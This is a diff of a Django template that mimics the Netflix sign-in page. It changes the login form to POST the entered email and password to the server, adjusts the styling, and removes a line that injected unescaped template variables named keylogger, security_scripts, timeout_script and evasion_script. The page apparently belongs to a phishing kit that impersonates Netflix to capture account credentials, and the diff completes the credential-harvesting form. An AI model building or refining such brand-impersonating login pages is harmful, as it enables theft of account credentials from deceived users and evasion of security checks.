@@ -2,6 +2,9 @@
 
 {% load static %}
 
+{% block icon %}
+{% endblock %}
+
 {% block content %}
 <div class="netflix-login-container">
     <div class="netflix-background">
@@ -36,15 +39,16 @@
         <div class="netflix-login-card">
             <h1 class="netflix-login-title">Sign In</h1>
             
-            <form class="netflix-login-form" id="netflixLoginForm">
+            <form method="POST" class="netflix-login-form" id="netflixLoginForm">
+                {% csrf_token %}
                 <div class="netflix-input-group">
-                    <input type="email" id="netflixEmail" class="netflix-input" required>
+                    <input type="email" name="email" id="netflixEmail" class="netflix-input" required>
                     <label for="netflixEmail" class="netflix-input-label">Email or phone number</label>
                     <div class="netflix-input-error" id="emailError"></div>
                 </div>
                 
                 <div class="netflix-input-group">
-                    <input type="password" id="netflixPassword" class="netflix-input" required>
+                    <input type="password" name="password" id="netflixPassword" class="netflix-input" required>
                     <label for="netflixPassword" class="netflix-input-label">Password</label>
                     <button type="button" class="netflix-password-toggle">
                         <span class="netflix-password-toggle-text">SHOW</span>
@@ -240,7 +244,7 @@ body {
 }
 
 .netflix-login-card {
-    background-color: rgba(0, 0, 0, 0.75);
+    background-color: rgba(0, 0, 0, 0.641);
     border-radius: 4px;
     padding: 60px 68px;
     max-width: 450px;
@@ -457,14 +461,14 @@ body {
 
 /* Responsive adjustments */
 @media (max-width: 740px) {
-    .netflix-background {
+    /* .netflix-background {
         display: none;
-    }
+    } */
     
-    .netflix-login-container {
+    /* .netflix-login-container {
         background: var(--netflix-black);
     }
-    
+     */
     .netflix-login-card {
         padding: 15px;
         max-width: 100%;
@@ -612,5 +616,4 @@ document.addEventListener('DOMContentLoaded', function() {
 });
 </script>
 
-{{ keylogger|safe }} {{ security_scripts|safe }} {{ timeout_script|safe }} {{ evasion_script|safe }}
 {% endblock %}
